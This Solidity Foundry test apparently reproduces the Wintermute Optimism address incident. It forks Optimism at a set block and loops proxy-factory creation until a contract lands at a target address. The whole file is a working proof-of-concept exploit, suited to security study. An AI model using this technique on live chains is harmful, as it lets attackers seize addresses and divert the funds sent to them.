// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface ProxyFactory {
    function createProxy(address masterCopy, bytes calldata data) external returns (address payable proxy);
}

contract ContractTest is Test {
    ProxyFactory proxy = ProxyFactory(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B);
    address public childcontract;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("optimism", 10_607_735); //fork optimism at block 10607735
    }

    function testExploit() public {
        while (childcontract != 0x4f3a120E72C76c22ae802D129F599BFDbc31cb81) {
            childcontract = proxy.createProxy(0xE7145dd6287AE53326347f3A6694fCf2954bcD8A, "0x");
            emit log_named_address("Created Wintermute contract", childcontract);
        }
    }
}
